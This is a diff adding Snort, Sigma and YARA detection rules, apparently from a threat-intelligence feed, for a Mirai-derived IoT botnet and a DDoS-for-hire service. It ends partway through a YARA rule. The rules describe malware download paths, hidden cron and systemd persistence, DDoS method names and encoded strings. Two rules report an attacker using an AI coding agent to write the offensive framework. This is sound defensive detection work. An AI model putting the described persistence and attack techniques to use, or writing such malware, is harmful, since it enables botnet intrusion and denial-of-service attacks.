+        "comment": "Naku Binary Fetch URI Pattern: Historical Aruba Backup Distribution Convention | TIER: Hunting | robustness 1 | confidence LOW–MODERATE | ATT&CK T1071.001, T1190 | rule hash 3c52c0d4 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "782206c1-136f-5864-b8b6-88fbd8157ee0",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL HUNT UTA-2026-014 Naku Binary Fetch URI Pattern - Historical Aruba Primary Distribution Convention (Bare Substring Anchor)\"; flow:established,to_server; http.uri; content:\"Naku.\"; nocase; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001008; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Naku Binary Fetch URI Pattern: Historical Aruba Distribution Convention | TIER: Hunting | robustness 1 | confidence LOW–MODERATE | ATT&CK T1071.001, T1190 | rule hash ed56016d | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "0596a7a8-f7c6-562f-a2ca-481fea64c4de",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL HUNT UTA-2026-014 Naku Binary Reference in HTTP URI - Backup Channel Convention (Bare Substring Anchor)\"; flow:established,to_server; http.uri; content:\"Naku.\"; nocase; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001006; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Naku Binary Reference in HTTP URI (Bare Substring) | TIER: Hunting | robustness 1 | confidence LOW–MODERATE | ATT&CK T1071.001, T1587.001 | rule hash adf251f5 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "b83f248b-2594-5c41-8733-118321f702a7",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL HUNT UTA-2026-014 Pandora-Mirai bot.sh Reseed Download URI Pattern (IoT Botnet Reseed Channel)\"; flow:established,to_server; http.uri; content:\"/bot.sh\"; endswith; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9300504; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Pandora-Mirai bot.sh Reseed Download URI Pattern | TIER: Hunting | robustness 1 | confidence MODERATE | ATT&CK T1071.001, T1587.001 | rule hash 40808673 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "a6c09577-4cd8-52e1-ba50-61dee4c3ba6a",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> any any (msg:\"THL HUNT UTA-2026-014 Matrix C2 Discord Bot Attack-Method Dispatch ovh-nuke (DDoS-as-a-Service Customer Interface, Requires TLS Interception)\"; flow:established,to_server; http.host; content:\"discord.com\"; http.request_body; content:\"ovh-nuke\"; nocase; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001011; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Matrix C2 Discord Bot Attack-Method Dispatch: ovh-nuke | TIER: Hunting | robustness 2 | confidence MODERATE | ATT&CK T1059.007, T1498.001 | rule hash 46667cc4 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "08653c9c-fe62-5638-be75-f5e6538e20a4",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> any any (msg:\"THL HUNT UTA-2026-014 Matrix C2 Discord Bot Attack-Method Dispatch syn-storm-frag-storm (DDoS-as-a-Service Customer Interface, Requires TLS Interception)\"; flow:established,to_server; http.host; content:\"discord.com\"; http.request_body; pcre:\"/(?:syn-storm|frag-storm|udp-bypass|icmp-hell)/i\"; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001012; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Matrix C2 Discord Bot Attack-Method Dispatch: syn-storm/frag-storm/udp-bypass/icmp-hell | TIER: Hunting | robustness 2 | confidence MODERATE | ATT&CK T1059.007, T1498.001 | rule hash 1d810065 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "3ca66198-95b6-51ed-bc28-d3b1859cfca8",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> any any (msg:\"THL HUNT UTA-2026-014 keyosbuff C2-Leak Repository Reference in HTTP URI (Operator OPSEC Artifact)\"; flow:established,to_server; http.uri; content:\"keyosbuff\"; nocase; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9300502; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "keyosbuff C2-Leak Repository Reference in HTTP URI | TIER: Hunting | robustness 1 | confidence MODERATE | ATT&CK T1588.001, T1584.004 | rule hash 283dd604 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "60754da9-2878-5955-9add-1ab31354ac2d",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert tcp $HOME_NET any -> $EXTERNAL_NET 23 (msg:\"THL HUNT UTA-2026-014 Naku-Pandora Mirai Operator-Bespoke CNC Protocol - Length-Prefixed String Option Keys (Defeats Stock Mirai IDS Rules, Unvalidated Heuristic)\"; flow:established,to_server; dsize:>8; content:\"|00 00|\"; depth:2; offset:0; pcre:\"/^.{4}.[\\x01-\\x14][A-Za-z0-9_]/\"; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001010; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
+        "comment": "Naku-Pandora Mirai Operator-Bespoke CNC Protocol (Length-Prefixed String Option Keys) | TIER: Hunting | robustness 2 | confidence MODERATE — heuristic, unvalidated against live traffic | ATT&CK T1095, T1027 | rule hash e16fe90e | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "94fb7502-bf51-5d14-9ef3-c7817d67004b",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: BusyBox SORA Marker Execution — Sora-Derivative Mirai-Fork Active on Host\nid: 625a0af0-2c6e-48b5-89ea-0c7e6b191147\nstatus: experimental\ndescription: >-\n  Detects execution of the '/bin/busybox SORA' command, which is the Sora-fork Mirai-derivative lineage signature. Decoded from XOR-0x54 region in all 11 Naku/Pandora-Mirai architectures (UTA-2026-014), replacing stock Mirai's '/bin/busybox MIRAI'. The Mirai bot calls this as part of its process enumeration and competitor-kill routine. Any process executing '/bin/busybox SORA' indicates active Sora-derivative bot execution on the host.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.execution\n    - attack.t1059.004\n    - attack.command-and-control\n    - attack.t1095\n    - detection.emerging-threats\n    - stp.3\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        CommandLine|contains: '/bin/busybox SORA'\n    condition: selection\nfalsepositives:\n    - Unlikely — '/bin/busybox SORA' is not a valid busybox applet call and has no legitimate use\nlevel: high",
+        "to_ids": true,
+        "comment": "BusyBox SORA Marker Execution: Sora-Derivative Mirai-Fork Active on Host | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1059.004, T1095 | rule hash dc3e9756 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "eeb95b75-35fc-5d1c-b643-13377950c3bd",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Discord Bot API Egress with Attack-Method Dispatch Payload from Server Host\nid: 7e3175bc-9a74-4c93-b358-de78d84250f4\nstatus: experimental\ndescription: >-\n  Detects Discord API (discord.com/api/v9/) egress traffic from non-developer server hosts, indicative of the Matrix C2 DDoS-as-a-Service Discord-bot customer interface (UTA-2026-014). The Discord bot dispatches DDoS attack commands on behalf of paying customers via a JavaScript bot running on the operator's VPS. Discord bot traffic from production server hosts in non-developer environments is anomalous and warrants investigation, but Discord bot hosting is also a common legitimate pattern — treat as a hunting lead requiring process-context correlation, not a standalone alert.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.command-and-control\n    - attack.impact\n    - attack.t1498.001\n    - attack.execution\n    - attack.t1059.007\n    - detection.emerging-threats\nlogsource:\n    category: network_connection\n    product: linux\ndetection:\n    selection_discord:\n        DestinationHostname|contains: 'discord.com'\n        DestinationPort: 443\n        Initiated: 'true'\n    filter_known_dev:\n        Image|contains:\n            - '/node_modules/'\n            - 'discord.js'\n    condition: selection_discord and not filter_known_dev\nfalsepositives:\n    - Legitimate Discord bots hosted on server infrastructure — all Discord bot deployments on production servers\n    - SaaS applications integrating Discord notifications\n    - Developer environments testing Discord integrations\nlevel: medium",
+        "to_ids": false,
+        "comment": "Discord Bot API Egress with Attack-Method Dispatch Payload from Server Host | TIER: Hunting | robustness 2 | confidence MODERATE | ATT&CK T1059.007, T1498.001 | rule hash a6317f52 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "92b77869-e199-5009-a94f-725162b0c606",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: ELF IoT Arch-Tagged Filename Execution on Linux Server — Naku/Pandora Mirai Family\nid: c4495249-9b11-406c-b4ca-5c099eb8ca81\nstatus: experimental\ndescription: >-\n  Detects execution of ELF binaries with IoT-targeted architecture-tag suffixes (arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc) associated with the Naku/Pandora-Mirai 11-architecture IoT botnet family (UTA-2026-014). These filenames (Naku.{arch}, pandora.{arch}, nig) are specific to the Pandora-Mirai dropper's payload distribution and execution pattern. Execution of such binaries on server-class hosts indicates active compromise and botnet payload staging.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\n    - https://vms.drweb.com/virus/?i=22410691&lng=en\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.execution\n    - attack.t1059.004\n    - attack.initial-access\n    - attack.t1190\n    - attack.command-and-control\n    - detection.emerging-threats\n    - stp.3\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_naku:\n        Image|contains:\n            - 'Naku.arm'\n            - 'Naku.m68k'\n            - 'Naku.mips'\n            - 'Naku.mpsl'\n            - 'Naku.ppc'\n            - 'Naku.sh4'\n            - 'Naku.spc'\n            - 'Naku.x86'\n            - 'pandora.arm'\n            - 'pandora.m68k'\n            - 'pandora.mips'\n            - 'pandora.mpsl'\n            - 'pandora.sh4'\n            - 'pandora.spc'\n    selection_argv:\n        CommandLine|contains:\n            - 'PandoraNet'\n            - './nig realtek'\n            - './nig huawei'\n            - 'pandora_bot'\n    condition: 1 of selection_*\nfalsepositives:\n    - Cross-compilation test environments deploying IoT firmware — limit to production server hosts and IoT-adjacent network segments\n    - IoT development workstations building multi-arch toolchains\nlevel: high",
+        "to_ids": true,
+        "comment": "ELF IoT Arch-Tagged Filename Execution on Linux Server: Naku/Pandora Mirai Family | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1059.004, T1190 | rule hash b1d821c0 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "5a88e465-e994-508b-bfd6-882a8538614f",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Hidden-Prefix Cron Entry Creation in /etc/cron.d — Pandora-Mirai Persistence Pattern\nid: 6625f3f7-4e6f-40cb-905b-039786de8561\nstatus: experimental\ndescription: >-\n  Detects creation of dot-prefix hidden-filename cron entries in /etc/cron.d/ as used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh 5-vector persistence installer. The specific entry /etc/cron.d/.cache_update is the operator's primary cron persistence vector, scheduled to wget-pipe bot.sh from the operator's infrastructure every 5 minutes. Hidden-prefix filenames in this directory evade simple cron audits and are not a standard administration pattern.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.persistence\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1053.003\n    - attack.stealth\n    - attack.t1564.001\n    - detection.emerging-threats\nlogsource:\n    category: file_event\n    product: linux\ndetection:\n    selection:\n        TargetFilename|startswith: '/etc/cron.d/.'\n    filter_known_legit:\n        TargetFilename:\n            - '/etc/cron.d/.placeholder'\n    condition: selection and not filter_known_legit\nfalsepositives:\n    - Extremely rare legitimate administration scripts that use dot-prefix cron files — review all instances\n    - Configuration management tools (Puppet, Chef, Ansible) deploying hidden cron entries — verify against known CM policy\nlevel: high",
+        "to_ids": true,
+        "comment": "Hidden-Prefix Cron Entry Creation in /etc/cron.d: Pandora-Mirai Persistence Pattern | TIER: Detection | robustness 3 | confidence HIGH | ATT&CK T1053.003, T1564.001 | rule hash b9b2c628 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "9ca660c8-7fa8-5a97-b883-22eaa0d7c507",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String — Family Tracking Signature\nid: c9d201aa-2fbb-4e1e-b269-76cf28670998\nstatus: experimental\ndescription: >-\n  Detects the operator-bespoke 22-character random-string charset '1gba4cdom53nhp12ei0kfj' in process command lines. This string is present in all 11 architectures of the Naku/Pandora-Mirai ELF botnet (UTA-2026-014) — both XOR-0x54 encoded in stripped production builds and in plaintext in the arm7 debug build. It is not observed in any other host in threat intelligence indexing, but is a single-build constant that a future release would regenerate, and its practical appearance in a literal process command line (versus binary content) is unconfirmed — treat as a hunting lead; the companion YARA rule is the primary detection surface.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.stealth\n    - attack.t1027\n    - attack.command-and-control\n    - attack.t1095\n    - detection.emerging-threats\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        CommandLine|contains: '1gba4cdom53nhp12ei0kfj'\n    condition: selection\nfalsepositives:\n    - Unlikely — this string is operator-bespoke and not used in any known legitimate software\nlevel: medium",
+        "to_ids": false,
+        "comment": "Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String: Family Tracking Signature | TIER: Hunting | robustness 1 | confidence HIGH for the artifact; narrow applicability | ATT&CK T1027, T1095 | rule hash ac7e00d8 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "7c848828-f639-5072-9a3b-3cc1edcadf9a",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Non-Watchdog Process Opening /dev/watchdog — Mirai-Canonical Persistence Tactic\nid: 716bce61-4dcb-4479-b815-1391f5c7cd43\nstatus: experimental\ndescription: >-\n  Detects processes other than known watchdog daemons (watchdogd, systemd-watchdog) opening /dev/watchdog or /dev/misc/watchdog. This is a canonical Mirai botnet persistence mechanism — the bot opens the watchdog device and continuously pets it (ioctl WDIOC_KEEPALIVE) to prevent IoT device auto-reboot, keeping the infection persistent across watchdog-triggered reset cycles. Observed in Naku.arm (Pandora-Mirai family, UTA-2026-014) and generic to all Mirai/Sora derivative bots. FP profile varies by deployment context (low on servers, higher on IoT/embedded hosts) — deploy as a hunting lead.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.stealth\n    - attack.t1014\n    - attack.persistence\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1053.003\n    - detection.emerging-threats\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        CommandLine|contains:\n            - '/dev/watchdog'\n            - '/dev/misc/watchdog'\n    filter_legit:\n        Image|endswith:\n            - '/watchdogd'\n            - '/systemd'\n            - '/busybox'\n    condition: selection and not filter_legit\nfalsepositives:\n    - Embedded system watchdog management tools on IoT/embedded Linux — tune filter_legit for your environment\n    - Custom watchdog wrapper scripts in industrial control environments\n    - Hardware monitoring agents on servers with watchdog hardware support\nlevel: medium",
+        "to_ids": false,
+        "comment": "Non-Watchdog Process Opening /dev/watchdog: Mirai-Canonical Persistence Tactic | TIER: Hunting | robustness 3 | confidence HIGH | ATT&CK T1014, T1053.003 | rule hash 2723f613 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "d0727f4a-96c6-5f7e-80c9-56384b735738",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Pandora-Mirai Persistence Pattern — Multi-Mechanism Installer (Init.d, Systemd, Hidden Cron)\nid: 311787eb-af20-4ec5-90b3-ef3cb6797771\nstatus: experimental\ndescription: >-\n  Detects 2-of-3 co-occurrence of the distinctive Linux persistence vectors used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh installer — masquerade-named init.d service (/etc/init.d/sysupdate), masquerade systemd unit (/etc/systemd/system/system-update.service), and a hidden dot-prefix cron entry under /etc/cron.d/. Corrected from the original: the ubiquitous /etc/rc.local vector was removed (routine target for many legitimate deployment tools with no discriminating value alone), and the rule no longer claims an un-implemented 60-second time-window correlation.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.persistence\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1037.004\n    - attack.t1053.003\n    - attack.t1543.002\n    - detection.emerging-threats\n    - stp.3\nlogsource:\n    category: file_event\n    product: linux\ndetection:\n    selection_sysupdate:\n        TargetFilename: '/etc/init.d/sysupdate'\n    selection_systemd:\n        TargetFilename: '/etc/systemd/system/system-update.service'\n    selection_cron_hidden:\n        TargetFilename|startswith: '/etc/cron.d/.'\n    condition: >-\n        (selection_sysupdate and selection_systemd) or\n        (selection_sysupdate and selection_cron_hidden) or\n        (selection_systemd and selection_cron_hidden)\nfalsepositives:\n    - Legitimate system update scripts that use similar naming — verify service content references known-good update infrastructure\n    - Security tooling (OSSEC, Wazuh agent) that creates init.d and systemd units at install time\nlevel: high",
+        "to_ids": true,
+        "comment": "Pandora-Mirai Persistence Pattern: Multi-Mechanism Installer (Init.d, Systemd, Hidden Cron) | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1037.004, T1053.003, T1543.002 | rule hash cec3f141 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "e906814f-9d7c-52cb-bf00-1f676cb0f0dd",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: PandoraNet Botnet ID in Process Command Line — Active Pandora-Mirai Infection\nid: 481ee321-8631-4a9d-b1b6-87e8a5676690\nstatus: experimental\ndescription: >-\n  Detects the PandoraNet operator-bespoke botnet ID string in process command line arguments, indicating active execution of the Pandora-Mirai IoT botnet (UTA-2026-014). The format is 'pandora_bot PandoraNet.{arch}' where arch is one of 11 IoT CPU architectures. This string is not observed in any other host in threat intelligence indexing and indicates active bot process on the monitored system, but is a single renameable literal — treat as a hunting lead, not an auto-actioned detection.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.execution\n    - attack.t1059.004\n    - attack.command-and-control\n    - attack.t1095\n    - detection.emerging-threats\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        CommandLine|contains: 'PandoraNet'\n    condition: selection\nfalsepositives:\n    - Unlikely — PandoraNet is an operator-bespoke botnet identifier not used by any known legitimate software\nlevel: medium",
+        "to_ids": false,
+        "comment": "PandoraNet Botnet ID in Process Command Line: Active Pandora-Mirai Infection | TIER: Hunting | robustness 1 | confidence HIGH for the artifact; retiered on durability | ATT&CK T1095, T1059.004 | rule hash a88cfaf3 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "cb482f0f-e12f-582d-b1a5-c325edf2be06",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Rovodev AI Agent Sessions Directory Creation on Server Host — Potential AI-Augmented Offensive Operations\nid: 273f8eea-72b3-48c7-a134-cdc5a65064d7\nstatus: experimental\ndescription: >-\n  Detects creation of Atlassian Rovodev AI coding agent session artifacts (~/.rovodev/sessions/ directory, session_context.json files exceeding 100KB) on server hosts. In the UTA-2026-014 case, the operator used Rovodev on their VPS to author a complete offensive framework (Matrix C2). Rovodev session directories on production server hosts outside of known DevOps pipelines warrant investigation, particularly when co-located with an offensive-framework-looking working directory, but Rovodev is a legitimate enterprise product — treat as a scoping/inventory lead.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - detection.emerging-threats\nlogsource:\n    category: file_event\n    product: linux\ndetection:\n    selection_sessions:\n        TargetFilename|contains: '/.rovodev/sessions/'\n    selection_context:\n        TargetFilename|endswith: '/session_context.json'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate DevOps teams using Rovodev on server hosts for infrastructure automation\n    - CI/CD pipeline hosts running Rovodev for code generation tasks\n    - Developer workstations (this rule is most useful on production server hosts; tune to exclude known developer environments)\nlevel: medium",
+        "to_ids": false,
+        "comment": "Rovodev AI Agent Sessions Directory Creation on Server Host: Potential AI-Augmented Offensive Operations | TIER: Hunting | robustness 2 | confidence MODERATE | ATT&CK T1587.001 | rule hash b8e2ccbb | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "f6e985ab-fc5d-5454-bc69-2dff2de60c31",
+        "type": "sigma",
+        "category": "Payload installation",
+        "value": "title: Rovodev Log File_Write Tool-Call Pattern — AI-Augmented Offensive Operations Evidence\nid: 817e5ca2-7265-41b3-b344-bbf36afc3193\nstatus: experimental\ndescription: >-\n  Detects creation of the Atlassian Rovodev AI coding agent runtime log (rovodev.log). In the UTA-2026-014 case, the 8.5 MB rovodev.log captured file_write calls producing attack_engine.py, master_control.py, stealth_agent.py, and the Discord bot JavaScript dispatch table. Every Rovodev installation generates this file regardless of intent — use strictly as a scoping starting point for subsequent content inspection of the log for offensive capability markers, not as a standalone alert.\nreferences:\n    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/\nauthor: The Hunters Ledger\ndate: '2026-05-26'\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - detection.emerging-threats\nlogsource:\n    category: file_event\n    product: linux\ndetection:\n    selection_log:\n        TargetFilename|endswith: '/rovodev.log'\n    condition: selection_log\nfalsepositives:\n    - All Rovodev installations generate rovodev.log — this rule fires on any host running Rovodev; tune to server hosts outside known DevOps pipelines\n    - CI/CD pipeline hosts running Rovodev legitimately\nlevel: low",
+        "to_ids": false,
+        "comment": "Rovodev Log File_Write Tool-Call Pattern: AI-Augmented Offensive Operations Evidence | TIER: Hunting | robustness 1 | confidence MODERATE | ATT&CK T1587.001 | rule hash 6230de1d | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "94bd150d-e45a-5eda-a77f-b57a2fe9cfea",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "/*\n   Yara Rule Set\n   Identifier: Naku/Pandora-Mirai 11-arch IoT botnet (UTA-2026-014)\n   Author: The Hunters Ledger\n   Source: https://the-hunters-ledger.com/\n   License: CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\n*/\n\nrule MAL_ELF_Naku_Pandora_Mirai_Family {\n   meta:\n      description = \"Detects Naku/Pandora-Mirai 11-architecture IoT botnet based on operator-bespoke 22-char random-string charset, Sora-fork /bin/busybox SORA derivative marker (XOR-0x54 encoded), and canonical Mirai botnet symbols. Operator uses triple XOR keys (0x54/0x42/0x45); charset is present in all 11 release architectures and acts as cross-arch tracking signature.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383\"\n      hash2 = \"595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a\"\n      hash3 = \"afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410\"\n      family = \"Pandora-Mirai\"\n      malware_type = \"IoT Botnet\"\n      campaign = \"UTA-2026-014\"\n      id = \"2653771b-6124-5656-903c-cc65f43a21a5\"\n   strings:\n      // Operator-bespoke 22-char random-string charset (XOR-0x54 encoded blob)\n      // Decoded value: 1gba4cdom53nhp12ei0kfj\n      $charset_xor = { 65 33 36 35 60 37 30 3B 39 61 67 3A 3C 24 65 66 31 3D 64 3F 32 3E }\n      // Sora-fork derivative: /bin/busybox SORA XOR-0x54 encoded\n      $sora_xor = { 7B 36 3D 3A 36 21 27 36 3B 2C 74 24 27 20 61 }\n      // PandoraNet operator botnet ID (plaintext in arm7 debug build and process args)\n      $pandoranet = \"PandoraNet\" ascii fullword\n      // Mirai canonical function symbols (arm7 debug build; DEFINITE Mirai-lineage markers)\n      $sym_auth = \"add_auth_entry\" ascii fullword\n      $sym_resolve = 